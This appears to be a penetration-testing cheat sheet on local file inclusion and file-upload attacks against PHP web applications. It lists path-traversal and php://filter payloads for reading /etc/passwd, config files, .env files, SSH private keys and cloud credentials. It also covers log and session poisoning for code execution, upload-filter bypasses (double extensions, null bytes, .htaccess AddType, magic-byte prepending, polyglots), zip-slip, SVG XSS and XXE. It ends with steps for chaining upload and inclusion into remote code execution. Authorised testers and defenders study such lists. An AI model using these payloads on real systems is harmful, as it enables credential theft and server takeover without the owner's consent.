# File Inclusion and Upload

Two classes that meet in the middle: read a file, or plant one.

---

## LFI

```
?file=../../../../etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd
?file=/etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=../config.php
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
?file=phar://upload/x.phar/x.php
```

Read `/proc/self/environ`, `/proc/self/cmdline`, `/etc/hostname`, app config, `.env`,
`~/.ssh/id_rsa`, cloud credential files.

---

## LFI → RCE

- Log poisoning: inject PHP into `User-Agent`, include `/var/log/apache2/access.log`.
- Session file poisoning: include `/var/lib/php/sessions/sess_<id>`.
- `php://input` with a POST body.
- `/proc/self/fd/N` for open descriptors.
- Upload a `.jpg` containing PHP, include it (with or without a wrapper).

---

## Wrappers

```
php://filter  php://input  data://  expect://  zip://  phar://  compress.zlib://
```

---

## Upload bypass

**Extension**

```
.php  .php3  .php4  .php5  .phtml  .phar  .pht  .pgif
.php.jpg  .jpg.php  .php%00.jpg  .pHp  .PHP5
```

**Content-Type** — lie: `image/jpeg` for a `.php`.

**Magic bytes** — prepend `GIF89a;` to PHP.

**.htaccess** — upload `.htaccess` with `AddType application/x-httpd-php .jpg`.

**Filename tricks**

```
shell.php/          shell.php.          shell.php%00.png
shell.pHp           shell.php::$DATA    ..%2fshell.php
```

**Polyglot** — valid image + valid PHP/JS in the same file.

---

## Where the file lands

- Same directory as the app (direct execution).
- `/uploads/` (execution depends on server config).
- Object storage (execution only if the bucket serves PHP — rare).
- A CDN path (check whether the origin executes).

---

## Zip-slip

Archive entries named `../../x.php` extract outside the target dir. Also symlink entries.

---

## Image-specific

- SVG with `<script>` (stored XSS when served inline).
- SVG with external entity (XXE).
- `Content-Type: image/svg+xml` + `image/svg+xml` sniffing.
- EXIF with a huge value (parser DoS).

---

## Go deeper

1. Determine the include root by counting `../` until it breaks.
2. Test whether a null byte or a trailing slash is needed.
3. Test whether the uploaded file is served with the right `Content-Type`.
4. Test the thumbnailer: it may fetch a URL (SSRF) or run ImageMagick (RCE).
5. Chain upload + LFI for guaranteed RCE.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
